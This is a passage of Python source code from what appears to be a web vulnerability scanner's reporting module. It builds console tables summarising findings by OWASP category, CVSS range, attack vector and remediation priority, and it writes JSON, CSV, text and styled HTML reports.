            
        # Enhanced OWASP category analysis
        owasp_data = {}
        owasp_severity = {}
        owasp_types = {}
        owasp_descriptions = {
            'A01:2025': 'Broken Access Control',
            'A02:2025': 'Cryptographic Failures', 
            'A03:2025': 'Injection Attacks',
            'A04:2025': 'Insecure Design',
            'A05:2025': 'Security Misconfiguration',
            'A06:2025': 'Vulnerable Components',
            'A07:2025': 'Authentication Failures',
            'A08:2025': 'Software Integrity Failures',
            'A09:2025': 'Logging Failures',
            'A10:2025': 'Server-Side Request Forgery'
        }
        
        for finding in self.findings:
            category = finding.get('owasp_category', 'Unknown')
            category_code = category.split('–')[0].strip() if '–' in category else category
            
            if category_code not in owasp_data:
                owasp_data[category_code] = 0
                owasp_severity[category_code] = []
                owasp_types[category_code] = set()
            
            owasp_data[category_code] += 1
            owasp_severity[category_code].append(finding.get('severity', 'INFO'))
            owasp_types[category_code].add(finding.get('type', 'Unknown'))
        
        if not owasp_data:
            return
        
        total_vulns = sum(owasp_data.values())
        data = sorted(owasp_data.items(), key=lambda x: x[1], reverse=True)
        
        self.console.print("\n")
        self.console.print(Panel(
            "[bold cyan]🎯 OWASP 2025 Framework Compliance & Risk Analysis[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for OWASP category analysis
        from rich.table import Table
        
        owasp_table = Table(title="🛡️ OWASP 2025 Category Distribution", show_header=True, header_style="bold magenta")
        owasp_table.add_column("Category", style="bold", width=12)
        owasp_table.add_column("Description", style="cyan", width=25)
        owasp_table.add_column("Visual Distribution", width=35)
        owasp_table.add_column("Count", justify="center", width=8)
        owasp_table.add_column("Percentage", justify="center", width=12)
        owasp_table.add_column("Risk Level", justify="center", width=12)
        owasp_table.add_column("Types", justify="center", width=8)
        
        max_count = max(count for _, count in data) if data else 1
        
        for category, count in data:
            percentage = (count / total_vulns) * 100
            description = owasp_descriptions.get(category, 'Unknown Category')
            
            # Calculate risk metrics for this category
            severities = owasp_severity[category]
            high_risk = sum(1 for s in severities if s.upper() in ['CRITICAL', 'HIGH'])
            risk_percentage = (high_risk / len(severities)) * 100 if severities else 0
            unique_types = len(owasp_types[category])
            
            # Risk level indicator with color
            if risk_percentage >= 80:
                risk_level = "[red]🔴 CRITICAL[/red]"
                row_color = "red"
            elif risk_percentage >= 60:
                risk_level = "[orange1]🟠 HIGH[/orange1]"
                row_color = "orange1"
            elif risk_percentage >= 40:
                risk_level = "[yellow]🟡 MEDIUM[/yellow]"
                row_color = "yellow"
            else:
                risk_level = "[green]🟢 LOW[/green]"
                row_color = "green"
            
            # Create visual progress bar
            bar_percentage = int((count / max_count) * 30)
            filled_blocks = '▓' * bar_percentage
            empty_blocks = '░' * (30 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            
            owasp_table.add_row(
                f"[{row_color}]{category}[/{row_color}]",
                f"[{row_color}]{description}[/{row_color}]",
                f"[{row_color}]{visual_bar}[/{row_color}]",
                f"[{row_color}]{count}[/{row_color}]",
                f"[{row_color}]{percentage:.1f}%[/{row_color}]",
                risk_level,
                f"[{row_color}]{unique_types}[/{row_color}]"
            )
        
        self.console.print(owasp_table)
        
        # OWASP compliance summary table
        compliance_table = Table(title="📊 OWASP 2025 Compliance Analysis", show_header=True, header_style="bold cyan")
        compliance_table.add_column("Compliance Metric", style="bold yellow", width=25)
        compliance_table.add_column("Score/Value", style="bold white", width=15)
        compliance_table.add_column("Assessment", style="cyan", width=50)
        
        # Calculate compliance metrics
        affected_categories = len(data)
        total_owasp_categories = 10  # OWASP Top 10
        compliance_score = max(0, (total_owasp_categories - affected_categories) / total_owasp_categories * 100)
        most_problematic = data[0] if data else ('N/A', 0)
        
        compliance_table.add_row(
            "🛡️ Categories Affected", 
            f"{affected_categories}/10", 
            f"OWASP Top 10 categories with identified vulnerabilities"
        )
        compliance_table.add_row(
            "📊 Compliance Score", 
            f"{compliance_score:.0f}/100", 
            "Overall OWASP 2025 framework compliance rating"
        )
        compliance_table.add_row(
            "🎯 Most Problematic", 
            f"{most_problematic[0]}", 
            f"{owasp_descriptions.get(most_problematic[0], 'Unknown')} - {most_problematic[1]} issues"
        )
        
        # Overall compliance status
        if compliance_score >= 80:
            compliance_status = "[green]✅ EXCELLENT[/green]"
            compliance_desc = "Strong OWASP compliance with minimal security gaps"
        elif compliance_score >= 60:
            compliance_status = "[yellow]🔶 GOOD[/yellow]"
            compliance_desc = "Acceptable compliance level with room for improvement"
        elif compliance_score >= 40:
            compliance_status = "[orange1]⚠️ NEEDS WORK[/orange1]"
            compliance_desc = "Multiple OWASP categories affected - requires attention"
        else:
            compliance_status = "[red]🚨 CRITICAL[/red]"
            compliance_desc = "Poor OWASP compliance - comprehensive security review needed"
        
        compliance_table.add_row(
            "🏆 Overall Status", 
            compliance_status, 
            compliance_desc
        )
        
        self.console.print("\n")
        self.console.print(compliance_table)

    def _display_cvss_score_graph(self):
        """Display comprehensive CVSS score distribution with detailed risk analytics."""
        if not self.findings:
            return
            
        # Enhanced CVSS analysis with detailed score tracking
        cvss_ranges = {
            '0.0-2.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'None/Low'},
            '2.1-4.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'Low'},
            '4.1-6.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'Medium'},
            '6.1-8.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'High'},
            '8.1-10.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'Critical'}
        }
        
        all_scores = []
        
        for finding in self.findings:
            cvss = finding.get('cvss_score', 0.0)
            vuln_type = finding.get('type', 'Unknown')
            all_scores.append(cvss)
            
            if cvss <= 2.0:
                cvss_ranges['0.0-2.0']['count'] += 1
                cvss_ranges['0.0-2.0']['scores'].append(cvss)
                cvss_ranges['0.0-2.0']['types'].add(vuln_type)
            elif cvss <= 4.0:
                cvss_ranges['2.1-4.0']['count'] += 1
                cvss_ranges['2.1-4.0']['scores'].append(cvss)
                cvss_ranges['2.1-4.0']['types'].add(vuln_type)
            elif cvss <= 6.0:
                cvss_ranges['4.1-6.0']['count'] += 1
                cvss_ranges['4.1-6.0']['scores'].append(cvss)
                cvss_ranges['4.1-6.0']['types'].add(vuln_type)
            elif cvss <= 8.0:
                cvss_ranges['6.1-8.0']['count'] += 1
                cvss_ranges['6.1-8.0']['scores'].append(cvss)
                cvss_ranges['6.1-8.0']['types'].add(vuln_type)
            else:
                cvss_ranges['8.1-10.0']['count'] += 1
                cvss_ranges['8.1-10.0']['scores'].append(cvss)
                cvss_ranges['8.1-10.0']['types'].add(vuln_type)
        
        # Filter out zero counts
        data = [(k, v) for k, v in cvss_ranges.items() if v['count'] > 0]
        
        if not data:
            return
        
        total_vulns = sum(range_data['count'] for _, range_data in data)
        
        self.console.print("\n")
        self.console.print(Panel(
            "[bold cyan]📈 Comprehensive CVSS v3.1 Score Distribution & Risk Analysis[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for CVSS distribution
        from rich.table import Table
        
        cvss_table = Table(title="📊 CVSS v3.1 Risk Assessment", show_header=True, header_style="bold magenta")
        cvss_table.add_column("CVSS Range", style="bold", width=12)
        cvss_table.add_column("Risk Level", style="bold", width=12)
        cvss_table.add_column("Visual Distribution", width=35)
        cvss_table.add_column("Count", justify="center", width=8)
        cvss_table.add_column("Percentage", justify="center", width=12)
        cvss_table.add_column("Avg Score", justify="center", width=10)
        cvss_table.add_column("Types", justify="center", width=8)
        cvss_table.add_column("Impact Level", width=15)
        
        # Enhanced color mapping
        range_colors = {
            '0.0-2.0': 'green',
            '2.1-4.0': 'yellow',
            '4.1-6.0': 'orange1',
            '6.1-8.0': 'red',
            '8.1-10.0': 'magenta'
        }
        
        impact_indicators = {
            '0.0-2.0': '✅ Minimal',
            '2.1-4.0': '🔶 Low Impact',
            '4.1-6.0': '⚠️ Medium Impact',
            '6.1-8.0': '🚨 High Impact',
            '8.1-10.0': '💀 Critical Impact'
        }
        
        max_count = max(range_data['count'] for _, range_data in data) if data else 1
        
        for score_range, range_data in sorted(data, key=lambda x: float(x[0].split('-')[0])):
            count = range_data['count']
            percentage = (count / total_vulns) * 100
            avg_score = sum(range_data['scores']) / len(range_data['scores']) if range_data['scores'] else 0.0
            unique_types = len(range_data['types'])
            risk_label = range_data['label']
            impact = impact_indicators.get(score_range, 'Unknown')
            color = range_colors.get(score_range, 'white')
            
            # Create enhanced visual progress bar
            bar_percentage = int((count / max_count) * 32)
            filled_blocks = '█' * bar_percentage
            empty_blocks = '░' * (32 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            
            cvss_table.add_row(
                f"[{color}]{score_range}[/{color}]",
                f"[{color}]{risk_label}[/{color}]",
                f"[{color}]{visual_bar}[/{color}]",
                f"[{color}]{count}[/{color}]",
                f"[{color}]{percentage:.1f}%[/{color}]",
                f"[{color}]{avg_score:.1f}[/{color}]",
                f"[{color}]{unique_types}[/{color}]",
                f"[{color}]{impact}[/{color}]"
            )
        
        self.console.print(cvss_table)
        
        # Enhanced statistical analysis table
        stats_table = Table(title="📈 Advanced Statistical Analysis", show_header=True, header_style="bold cyan")
        stats_table.add_column("Statistical Metric", style="bold yellow", width=25)
        stats_table.add_column("Value", style="bold white", width=15)
        stats_table.add_column("Risk Interpretation", style="cyan", width=50)
        
        # Calculate comprehensive statistics
        avg_cvss = sum(all_scores) / len(all_scores) if all_scores else 0.0
        min_cvss = min(all_scores) if all_scores else 0.0
        max_cvss = max(all_scores) if all_scores else 0.0
        score_range = max_cvss - min_cvss
        
        # Standard deviation
        if len(all_scores) > 1:
            variance = sum((x - avg_cvss) ** 2 for x in all_scores) / len(all_scores)
            std_dev = variance ** 0.5
        else:
            std_dev = 0.0
        
        # Risk distribution analysis
        high_risk = sum(range_data['count'] for score_range, range_data in data if float(score_range.split('-')[0]) >= 7.0)
        medium_risk = sum(range_data['count'] for score_range, range_data in data if 4.0 <= float(score_range.split('-')[0]) < 7.0)
        low_risk = total_vulns - high_risk - medium_risk
        
        stats_table.add_row(
            "📊 Average CVSS Score",
            f"{avg_cvss:.2f}/10.0",
            "Mean severity across all vulnerabilities"
        )
        stats_table.add_row(
            "📏 Score Range",
            f"{min_cvss:.1f} - {max_cvss:.1f}",
            f"Risk spread of {score_range:.1f} points"
        )
        stats_table.add_row(
            "📈 Standard Deviation",
            f"{std_dev:.2f}",
            "Score consistency - lower values indicate uniform risk levels"
        )
        stats_table.add_row(
            "🔴 High Risk (7.0+)",
            f"{high_risk} ({(high_risk/total_vulns)*100:.1f}%)",
            "Critical vulnerabilities requiring immediate remediation"
        )
        stats_table.add_row(
            "🟡 Medium Risk (4.0-6.9)",
            f"{medium_risk} ({(medium_risk/total_vulns)*100:.1f}%)",
            "Moderate vulnerabilities for scheduled remediation"
        )
        stats_table.add_row(
            "🟢 Low Risk (<4.0)",
            f"{low_risk} ({(low_risk/total_vulns)*100:.1f}%)",
            "Lower priority items for routine maintenance"
        )
        
        # Overall security posture
        if avg_cvss >= 7.0:
            posture = "[red]🚨 HIGH RISK[/red]"
            posture_desc = "Critical security intervention needed immediately"
        elif avg_cvss >= 4.0:
            posture = "[yellow]🔶 MODERATE RISK[/yellow]"
            posture_desc = "Active monitoring and planned remediation required"
        else:
            posture = "[green]✅ LOW RISK[/green]"
            posture_desc = "Acceptable risk profile with standard maintenance"
        
        stats_table.add_row(
            "�️ Security Posture",
            posture,
            posture_desc
        )
        
        self.console.print("\n")
        self.console.print(stats_table)

    def _display_attack_vector_graph(self):
        """Display comprehensive attack vector analysis with threat modeling insights."""
        if not self.findings:
            return
            
        # Enhanced attack vector analysis with detailed threat intelligence
        vector_data = {}
        vector_severity = {}
        vector_types = {}
        vector_complexity = {}
        
        for finding in self.findings:
            vector = finding.get('attack_vector', 'Unknown')
            severity = finding.get('severity', 'INFO')
            vuln_type = finding.get('type', 'Unknown')
            complexity = finding.get('exploit_difficulty', 'Unknown')
            
            if vector not in vector_data:
                vector_data[vector] = 0
                vector_severity[vector] = []
                vector_types[vector] = set()
                vector_complexity[vector] = []
            
            vector_data[vector] += 1
            vector_severity[vector].append(severity)
            vector_types[vector].add(vuln_type)
            vector_complexity[vector].append(complexity)
        
        if not vector_data:
            return
        
        total_vulnerabilities = sum(vector_data.values())
        data = sorted(vector_data.items(), key=lambda x: x[1], reverse=True)
        
        self.console.print("\n")
        self.console.print(Panel(
            "[bold cyan]🎯 Comprehensive Attack Vector & Threat Surface Analysis[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for attack vector analysis
        vector_table = Table(title="🎯 Attack Vector Distribution & Threat Analysis", show_header=True, header_style="bold magenta")
        vector_table.add_column("Vector", style="bold", width=12)
        vector_table.add_column("Visual Distribution", style="cyan", width=35)
        vector_table.add_column("Count", style="bold", width=8)
        vector_table.add_column("Percentage", style="bold", width=10)
        vector_table.add_column("Threat Level", style="bold", width=10)
        vector_table.add_column("Types", style="bold", width=8)
        vector_table.add_column("Complexity", style="bold", width=12)
        vector_table.add_column("Risk Assessment", style="bold", width=15)
        
        vector_emojis = {
            'Network': '🌐',
            'Adjacent': '📡',
            'Local': '💻',
            'Physical': '🔧',
            'Unknown': '❓'
        }
        
        threat_levels = {
            'Network': 'HIGH',
            'Adjacent': 'MEDIUM',
            'Local': 'MEDIUM',
            'Physical': 'LOW',
            'Unknown': 'UNKNOWN'
        }
        
        risk_assessments = {
            'Network': '🔴 Remote',
            'Adjacent': '� Adjacent',
            'Local': '� Local',
            'Physical': '� Physical',
            'Unknown': '❓ Unknown'
        }
        
        max_count = max(count for _, count in data) if data else 1
        
        vector_colors = {
            'Network': 'red',
            'Adjacent': 'orange1',
            'Local': 'green',
            'Physical': 'blue',
            'Unknown': 'white'
        }
        
        for vector, count in data:
            percentage = (count / total_vulnerabilities) * 100
            color = vector_colors.get(vector, 'white')
            threat_level = threat_levels.get(vector, 'UNKNOWN')
            risk_assessment = risk_assessments.get(vector, '❓ Unknown')
            unique_types = len(vector_types[vector])
            
            # Calculate most common complexity
            complexities = vector_complexity[vector]
            most_common_complexity = max(set(complexities), key=complexities.count) if complexities else 'Unknown'
            
            # Create visual progress bar
            bar_percentage = int((count / max_count) * 32)
            filled_blocks = '▓' * bar_percentage
            empty_blocks = '░' * (32 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            vector_emoji = vector_emojis.get(vector, '❓')
            
            vector_table.add_row(
                f"[{color}]{vector_emoji} {vector}[/{color}]",
                f"[{color}]{visual_bar}[/{color}]",
                f"[{color}]{count}[/{color}]",
                f"[{color}]{percentage:.1f}%[/{color}]",
                f"[{color}]{threat_level}[/{color}]",
                f"[{color}]{unique_types}[/{color}]",
                f"[{color}]{most_common_complexity}[/{color}]",
                f"[{color}]{risk_assessment}[/{color}]"
            )
        
        self.console.print(vector_table)
        
        # Threat analysis summary table
        threat_table = Table(title="🔍 Threat Surface Analysis", show_header=True, header_style="bold cyan")
        threat_table.add_column("Threat Metric", style="bold yellow", width=25)
        threat_table.add_column("Value", style="bold white", width=15)
        threat_table.add_column("Security Implications", style="cyan", width=50)
        
        # Calculate threat surface metrics
        network_vectors = sum(count for vector, count in data if vector == 'Network')
        local_vectors = sum(count for vector, count in data if vector in ['Local', 'Adjacent'])
        physical_vectors = sum(count for vector, count in data if vector == 'Physical')
        unknown_vectors = sum(count for vector, count in data if vector == 'Unknown')
        
        # Primary attack vector
        primary_vector = max(data, key=lambda x: x[1])[0] if data else 'Unknown'
        
        # Complexity assessment
        easy_exploits = sum(1 for complexities in vector_complexity.values() for c in complexities if c.lower() in ['easy', 'low'])
        
        threat_table.add_row(
            "🎯 Total Attack Vectors",
            str(len(data)),
            "Unique attack vector types identified in vulnerability set"
        )
        threat_table.add_row(
            "🌐 Remote Attack Surface",
            f"{network_vectors} ({(network_vectors/total_vulnerabilities)*100:.1f}%)",
            "Network-accessible vulnerabilities exposing remote attack surface"
        )
        threat_table.add_row(
            "💻 Local Attack Surface",
            f"{local_vectors} ({(local_vectors/total_vulnerabilities)*100:.1f}%)",
            "Local and adjacent network access required vulnerabilities"
        )
        threat_table.add_row(
            "🔧 Physical Attack Surface",
            f"{physical_vectors} ({(physical_vectors/total_vulnerabilities)*100:.1f}%)",
            "Physical access required for exploitation"
        )
        threat_table.add_row(
            "🎯 Primary Threat Vector",
            primary_vector,
            f"Most common attack vector requiring focused defensive measures"
        )
        threat_table.add_row(
            "⚡ Easy Exploitation",
            f"{easy_exploits} ({(easy_exploits/total_vulnerabilities)*100:.1f}%)",
            "Low-complexity vulnerabilities enabling rapid exploitation"
        )
        
        # Security posture assessment
        if network_vectors >= total_vulnerabilities * 0.7:
            threat_posture = "[red]🚨 HIGH THREAT[/red]"
            threat_desc = "Significant remote attack surface requiring immediate perimeter defense"
        elif network_vectors >= total_vulnerabilities * 0.3:
            threat_posture = "[orange1]⚠️ MODERATE THREAT[/orange1]"
            threat_desc = "Balanced threat surface requiring comprehensive security controls"
        else:
            threat_posture = "[green]🟢 LOW THREAT[/green]"
            threat_desc = "Limited remote exposure with primarily local attack vectors"
        
        threat_table.add_row(
            "🛡️ Threat Exposure",
            threat_posture,
            threat_desc
        )
        
        self.console.print("\n")
        self.console.print(threat_table)

    def _display_remediation_priority_graph(self):
        """Display comprehensive remediation priority analysis with resource planning."""
        if not self.findings:
            return
            
        # Enhanced remediation priority analysis
        priority_data = {}
        priority_effort = {}
        priority_timeline = {}
        priority_types = {}
        priority_business_impact = {}
        
        effort_mapping = {
            '🔴 URGENT': {'effort': 'High', 'timeline': '24-48 hours', 'business_impact': 'Critical'},
            '⚠️ HIGH': {'effort': 'Medium-High', 'timeline': '1-2 weeks', 'business_impact': 'High'},
            '🔶 MEDIUM': {'effort': 'Medium', 'timeline': '2-4 weeks', 'business_impact': 'Medium'},
            '🟢 LOW': {'effort': 'Low', 'timeline': '1-3 months', 'business_impact': 'Low'},
            '📋 INFO': {'effort': 'Minimal', 'timeline': 'Next cycle', 'business_impact': 'Minimal'}
        }
        
        for finding in self.findings:
            priority = self._calculate_remediation_priority(finding)
            vuln_type = finding.get('type', 'Unknown')
            severity = finding.get('severity', 'INFO')
            cvss = finding.get('cvss_score', 0.0)
            
            if priority not in priority_data:
                priority_data[priority] = 0
                priority_types[priority] = set()
            
            priority_data[priority] += 1
            priority_types[priority].add(vuln_type)
        
        # Filter out zero counts
        data = [(k, v) for k, v in priority_data.items() if v > 0]
        
        if not data:
            return
        
        total_issues = sum(priority_data.values())
        
        self.console.print("\n")
        self.console.print(Panel(
            "[bold cyan]🚀 Comprehensive Remediation Priority & Resource Planning[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for remediation priority analysis
        priority_table = Table(title="🚀 Remediation Priority Distribution & Resource Planning", show_header=True, header_style="bold magenta")
        priority_table.add_column("Priority", style="bold", width=12)
        priority_table.add_column("Visual Distribution", style="cyan", width=42)
        priority_table.add_column("Count", style="bold", width=8)
        priority_table.add_column("Percentage", style="bold", width=10)
        priority_table.add_column("Timeline", style="bold", width=12)
        priority_table.add_column("Effort", style="bold", width=12)
        priority_table.add_column("Impact", style="bold", width=12)
        
        # Priority color mapping for rich table
        priority_colors = {
            '🔴 URGENT': 'red',
            '⚠️ HIGH': 'orange1',
            '🔶 MEDIUM': 'yellow',
            '🟢 LOW': 'green',
            '📋 INFO': 'blue'
        }
        
        max_count = max(count for _, count in data) if data else 1
        
        for priority, count in data:
            percentage = (count / total_issues) * 100
            color = priority_colors.get(priority, 'white')
            
            effort_info = effort_mapping.get(priority, {'effort': 'Unknown', 'timeline': 'Unknown', 'business_impact': 'Unknown'})
            timeline = effort_info['timeline']
            effort = effort_info['effort']
            business_impact = effort_info['business_impact']
            
            # Create visual progress bar
            bar_percentage = int((count / max_count) * 40)
            filled_blocks = '▓' * bar_percentage
            empty_blocks = '░' * (40 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            
            priority_table.add_row(
                f"[{color}]{priority}[/{color}]",
                f"[{color}]{visual_bar}[/{color}]",
                f"[{color}]{count}[/{color}]",
                f"[{color}]{percentage:.1f}%[/{color}]",
                f"[{color}]{timeline}[/{color}]",
                f"[{color}]{effort}[/{color}]",
                f"[{color}]{business_impact}[/{color}]"
            )
        
        self.console.print(priority_table)
        
        # Create resource planning analytics table
        planning_table = Table(title="📋 Resource Planning & Timeline Analysis", show_header=True, header_style="bold cyan")
        planning_table.add_column("Planning Category", style="bold yellow", width=25)
        planning_table.add_column("Value", style="bold white", width=15)
        planning_table.add_column("Assessment", style="cyan", width=50)
        
        # Calculate values
        urgent_count = priority_data.get('🔴 URGENT', 0)
        high_count = priority_data.get('⚠️ HIGH', 0)
        medium_count = priority_data.get('🔶 MEDIUM', 0)
        low_count = priority_data.get('🟢 LOW', 0)
        info_count = priority_data.get('📋 INFO', 0)
        
        critical_business_impact = urgent_count + high_count
        total_effort_points = (urgent_count * 8) + (high_count * 5) + (medium_count * 3) + (low_count * 1) + (info_count * 0.5)
        high_risk_percentage = ((urgent_count + high_count) / total_issues) * 100 if total_issues > 0 else 0
        
        # Team requirement assessment
        if urgent_count > 0:
            team_requirement = "IMMEDIATE (critical vulnerabilities present)"
        elif high_count > 3:
            team_requirement = "HIGH (multiple high-priority issues)"
        else:
            team_requirement = "NORMAL (standard remediation cycle)"
        
        # Risk classification
        if high_risk_percentage >= 70:
            risk_classification = f"🚨 CRITICAL: {high_risk_percentage:.1f}% high-risk issues - Emergency response required"
        elif high_risk_percentage >= 40:
            risk_classification = f"⚠️ HIGH: {high_risk_percentage:.1f}% high-risk issues - Accelerated remediation needed"
        elif high_risk_percentage >= 20:
            risk_classification = f"🔶 MODERATE: {high_risk_percentage:.1f}% high-risk issues - Standard remediation timeline"
        else:
            risk_classification = f"✅ LOW: {high_risk_percentage:.1f}% high-risk issues - Maintenance-level effort"
        
        # Add rows to planning table
        planning_table.add_row(
            "⚡ Immediate Action Required",
            f"{urgent_count}",
            "24-48 hour SLA vulnerabilities requiring emergency response"
        )
        planning_table.add_row(
            "🚀 Short-term Planning",
            f"{high_count}",
            "1-2 weeks timeline for high-priority remediation"
        )
        planning_table.add_row(
            "📅 Medium-term Planning", 
            f"{medium_count}",
            "2-4 weeks timeline for medium-priority issues"
        )
        planning_table.add_row(
            "🔄 Long-term Planning",
            f"{low_count}",
            "1-3 months timeline for low-priority vulnerabilities"
        )
        planning_table.add_row(
            "📋 Maintenance Items",
            f"{info_count}",
            "Next development cycle for informational items"
        )
        planning_table.add_row(
            "� Critical Business Impact",
            f"{critical_business_impact}",
            f"Vulnerabilities requiring immediate attention ({critical_business_impact/total_issues*100:.1f}% of total)"
        )
        planning_table.add_row(
            "📊 Estimated Total Effort",
            f"{total_effort_points:.1f} pts",
            "Story points based on complexity and priority analysis"
        )
        planning_table.add_row(
            "👥 Security Team Required",
            team_requirement.split()[0],
            team_requirement
        )
        planning_table.add_row(
            "🎯 Risk Classification",
            risk_classification.split(':')[0],
            risk_classification
        )
        
        self.console.print("\n")
        self.console.print(planning_table)

    def _save_detailed_report(self):
        """Save comprehensive detailed report."""
        output_path = Path(self.config.args.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        file_format = self.config.args.format.lower()
        
        try:
            if file_format == 'json':
                # Enhanced JSON with all detailed information
                detailed_data = {
                    'scan_metadata': {
                        'timestamp': datetime.now().isoformat(),
                        'total_vulnerabilities': len(self.findings),
                        'security_posture': self._assess_security_posture(),
                        'statistics': self._calculate_comprehensive_stats()
                    },
                    'vulnerabilities': self.findings
                }
                with open(output_path, 'w') as f: 
                    json.dump(detailed_data, f, indent=4)
            
            elif file_format == 'csv' and self.df is not None: 
                self.df.to_csv(output_path, index=False)
            
            elif file_format == 'html': 
                self._generate_professional_html_report(output_path)
            
            elif file_format == 'text':
                with open(output_path, 'w') as f:
                    f.write("=== DETAILED VULNERABILITY ASSESSMENT REPORT ===\n\n")
                    for finding in self.findings:
                        f.write(f"Vulnerability Type: {finding.get('type', 'N/A')}\n")
                        f.write(f"Severity: {finding.get('severity', 'N/A')}\n")
                        f.write(f"CVSS Score: {finding.get('cvss_score', 'N/A')}\n")
                        f.write(f"Risk Score: {finding.get('risk_score', 'N/A')}\n")
                        f.write(f"OWASP Category: {finding.get('owasp_category', 'N/A')}\n")
                        f.write(f"CWE ID: {finding.get('cwe_id', 'N/A')}\n")
                        f.write(f"CVE References: {', '.join(finding.get('cve_references', []))}\n")
                        f.write(f"Impact: {finding.get('impact_description', 'N/A')}\n")
                        f.write(f"Business Impact: {finding.get('business_impact', 'N/A')}\n")
                        f.write(f"Remediation: {finding.get('remediation_steps', 'N/A')}\n")
                        f.write(f"Technical Details: {finding.get('technical_details', 'N/A')}\n")
                        f.write(f"Affected URL: {finding.get('url', 'N/A')}\n")
                        f.write(f"Discovery Method: {finding.get('discovery_method', 'N/A')}\n")
                        f.write("-" * 80 + "\n\n")
            
            if not self.config.args.quiet: 
                self.console.print(f"📄 [bold green]Detailed report saved:[/bold green] {output_path}")
        except Exception as e: 
            self.console.print(f"❌ [bold red]Error saving report:[/bold red] {e}")

    def _generate_professional_html_report(self, output_path):
        """Generate an industry-standard, professional HTML vulnerability assessment report."""
        try:
            # Calculate comprehensive statistics
            total_vulns = len(self.findings)
            severity_counts = {}
            attack_vectors = {}
            owasp_categories = {}
            
            for finding in self.findings:
                severity = finding.get('severity', 'Unknown').upper()
                severity_counts[severity] = severity_counts.get(severity, 0) + 1
                
                attack_vector = finding.get('attack_vector', 'Unknown')
                attack_vectors[attack_vector] = attack_vectors.get(attack_vector, 0) + 1
                
                owasp_cat = finding.get('owasp_category', 'Unknown')
                owasp_categories[owasp_cat] = owasp_categories.get(owasp_cat, 0) + 1
            
            # Get comprehensive scan metadata
            scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            target_url = getattr(self.config.args, 'url', 'Unknown')
            security_posture = self._assess_security_posture()
            
            # Get technical intelligence if available
            tech_stack = getattr(self, 'site_info', {})
            server_software = tech_stack.get('server_software', 'Unknown')
            ip_address = tech_stack.get('ip_address', 'Unknown')
            programming_language = tech_stack.get('programming_language', 'Unknown')
            cms_platform = tech_stack.get('cms_platform', 'Unknown')
            
            # Create industry-standard HTML template with Bungee font
            html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DuskProbe Security Assessment Report - {target_url}</title>
    <link href="https://fonts.googleapis.com/css2?family=Bungee:wght@400&family=Bungee+Shade&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        :root {{
            --primary-color: #1a1a2e;
            --secondary-color: #16213e;
            --accent-color: #0f3460;
            --highlight-color: #e94560;
            --success-color: #28a745;
            --warning-color: #ffc107;
            --danger-color: #dc3545;
            --info-color: #17a2b8;
            --light-bg: #f8f9fa;
            --dark-text: #2c3e50;
            --border-radius: 12px;
            --box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }}
        
        body {{
            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            line-height: 1.6;
            color: var(--dark-text);
            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #89c9fc 100%);
            min-height: 100vh;
            padding: 20px 0;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
        }}
        
        /* Header Section */
        .report-header {{
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-radius: var(--border-radius);
            padding: 40px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
            position: relative;
            overflow: hidden;
        }}
        
        .report-header::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 20"><defs><radialGradient id="a" cx="50%" cy="40%" r="50%"><stop offset="0%" stop-color="%23fff" stop-opacity=".1"/><stop offset="100%" stop-color="%23fff" stop-opacity="0"/></radialGradient></defs><rect width="100" height="20" fill="url(%23a)"/></svg>');
            opacity: 0.1;
        }}
        
        .header-content {{
            position: relative;
            z-index: 1;
        }}
        
        .report-title {{
            font-family: 'Bungee', cursive;
            font-size: 3.2em;
            margin-bottom: 15px;
            text-align: center;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        
        .report-subtitle {{
            font-family: 'Bungee', cursive;
            font-size: 1.4em;
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.9;
        }}
        
        .scan-metadata {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }}
        
        .metadata-card {{
            background: rgba(255, 255, 255, 0.1);
            border-radius: var(--border-radius);
            padding: 20px;
            backdrop-filter: blur(10px);
        }}
        
        .metadata-label {{
            font-weight: 600;
            opacity: 0.8;
            font-size: 0.9em;
            margin-bottom: 5px;
        }}
        
        .metadata-value {{
            font-size: 1.1em;
            font-weight: 700;
        }}
        
        /* Executive Summary */
        .executive-summary {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
        }}
        
        .section-title {{
            font-family: 'Bungee', cursive;
            font-size: 2em;
            color: var(--primary-color);
            margin-bottom: 25px;
            border-bottom: 4px solid var(--highlight-color);
            padding-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 15px;
        }}
        
        .summary-grid {{
            display: grid;
